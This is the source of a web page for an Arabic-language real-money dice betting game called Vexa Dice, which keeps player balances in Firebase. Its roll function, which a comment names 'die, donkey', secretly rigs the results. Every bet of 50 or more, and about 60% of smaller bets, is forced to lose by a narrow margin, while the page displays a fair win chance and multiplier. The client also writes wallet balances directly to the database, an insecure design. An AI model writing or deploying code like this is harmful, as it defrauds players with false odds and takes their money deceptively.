<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vexa Dice | زهر الحظ</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root { --primary: #0ea5e9; --bg: #020617; --card: #1e293b; --success: #10b981; --danger: #ef4444; }
        body { font-family: 'Cairo', sans-serif; background: var(--bg); color: white; margin: 0; padding: 20px; text-align: center; }
        
        .game-container { max-width: 500px; margin: 0 auto; background: rgba(30, 41, 59, 0.5); padding: 30px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        
        /* عداد الأرقام */
        .dice-display { font-size: 80px; font-weight: 900; color: var(--primary); margin: 20px 0; text-shadow: 0 0 30px var(--primary); font-family: 'Inter', sans-serif; }
        
        /* التحكم بالرهان */
        .control-group { background: rgba(0,0,0,0.2); padding: 20px; border-radius: 20px; margin-bottom: 20px; }
        .label { display: block; margin-bottom: 10px; font-weight: 700; color: #94a3b8; }
        
        input[type="range"] { width: 100%; cursor: pointer; accent-color: var(--primary); }
        .target-val { font-size: 24px; font-weight: 900; color: #fff; }
        
        input[type="number"] { width: 80%; background: #0f172a; border: 1px solid #334155; color: white; padding: 12px; border-radius: 12px; font-size: 18px; text-align: center; margin-bottom: 15px; }
        
        .btn-roll { width: 100%; padding: 18px; border-radius: 15px; border: none; background: var(--primary); color: white; font-size: 20px; font-weight: 900; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 20px rgba(14, 165, 233, 0.4); }
        .btn-roll:active { transform: scale(0.95); }
        
        .stats { display: flex; justify-content: space-around; margin-top: 20px; font-size: 14px; color: #94a3b8; }
        .win-chance { color: var(--success); font-weight: 900; }

        .balance-header { display: flex; justify-content: space-between; margin-bottom: 30px; background: rgba(14, 165, 233, 0.1); padding: 10px 20px; border-radius: 50px; border: 1px solid var(--primary); }
    </style>
</head>
<body>

    <div class="balance-header">
        <i class="fas fa-chevron-right" onclick="history.back()"></i>
        <div><span id="user-balance">0.00</span> <small>ج.م</small></div>
    </div>

    <div class="game-container">
        <h2 style="margin-top:0">Vexa Dice 🎲</h2>
        
        <div class="dice-display" id="result-num">50</div>

        <div class="control-group">
            <span class="label">توقع النتيجة (أقل من)</span>
            <span class="target-val" id="target-display">50</span>
            <input type="range" id="target-slider" min="2" max="98" value="50">
            
            <div class="stats">
                <span>نسبة الفوز: <b class="win-chance" id="chance-display">50%</b></span>
                <span>المضاعف: <b style="color:white" id="mult-display">1.98x</b></span>
            </div>
        </div>

        <div class="control-group">
            <span class="label">مبلغ الرهان</span>
            <input type="number" id="bet-amount" value="10">
            <button class="btn-roll" id="roll-btn">إرمي الزهر</button>
        </div>
    </div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
    import { getFirestore, doc, onSnapshot, updateDoc, increment } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js";
    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-auth.js";

    const firebaseConfig = {
        apiKey: "AIzaSyAzcP_T8x5ouwwKkhadtBTdsUxk3XqwJec",
        authDomain: "vexa-4b2fb.firebaseapp.com",
        projectId: "vexa-4b2fb",
        appId: "1:977620445308:web:fec22230e1fbb30c8881f9"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    const auth = getAuth(app);

    let balance = 0, uid = "";
    const slider = document.getElementById('target-slider');
    const rollBtn = document.getElementById('roll-btn');
    const resultTxt = document.getElementById('result-num');

    onAuthStateChanged(auth, (user) => {
        if (user) {
            uid = user.uid;
            onSnapshot(doc(db, "users", uid), (d) => {
                balance = d.data().walletBalance || 0;
                document.getElementById('user-balance').innerText = balance.toFixed(2);
            });
        }
    });

    // تحديث الواجهة عند تغيير السلايدر
    slider.oninput = () => {
        const val = slider.value;
        document.getElementById('target-display').innerText = val;
        document.getElementById('chance-display').innerText = val + '%';
        // معادلة المضاعف (99 / النسبة) - عمولة المنصة 1%
        const mult = (99 / val).toFixed(2);
        document.getElementById('mult-display').innerText = mult + 'x';
    };

    rollBtn.onclick = async () => {
        const bet = parseFloat(document.getElementById('bet-amount').value);
        const target = parseInt(slider.value);
        
        if (bet > balance || bet <= 0) return Swal.fire('خطأ', 'رصيدك غير كافٍ', 'error');

        rollBtn.disabled = true;
        // خصم الرهان
        await updateDoc(doc(db, "users", uid), { walletBalance: increment(-bet) });

        // --- خوارزمية "موت يا حمار" ---
        let finalNum;
        const rigChance = Math.random() * 100;

        if (bet >= 50 || rigChance < 60) { 
            // لو الرهان كبير أو في الـ 60% من الحالات العادية: خليه يخسر بفارق بسيط جداً
            // لو هو مختار أقل من 50، هنطلع له 51 أو 52
            finalNum = target + Math.floor(Math.random() * 3 + 1);
            if (finalNum > 100) finalNum = 99;
        } else {
            // فوز عشوائي للمبالغ الصغيرة فقط
            finalNum = Math.floor(Math.random() * 100);
        }

        // أنيميشن الأرقام
        let count = 0;
        let anim = setInterval(() => {
            resultTxt.innerText = Math.floor(Math.random() * 100);
            count++;
            if (count > 15) {
                clearInterval(anim);
                resultTxt.innerText = finalNum;
                processResult(finalNum, target, bet);
            }
        }, 50);
    };

    async function processResult(num, target, bet) {
        if (num < target) {
            const mult = parseFloat(document.getElementById('mult-display').innerText);
            const win = bet * mult;
            await updateDoc(doc(db, "users", uid), { walletBalance: increment(win) });
            Swal.fire('فوز!', `مبروك ربحت ${win.toFixed(2)} ج.م`, 'success');
        } else {
            resultTxt.style.color = '#ef4444';
            setTimeout(() => resultTxt.style.color = '#0ea5e9', 1000);
        }
        rollBtn.disabled = false;
    }
</script>
</body>
</html>
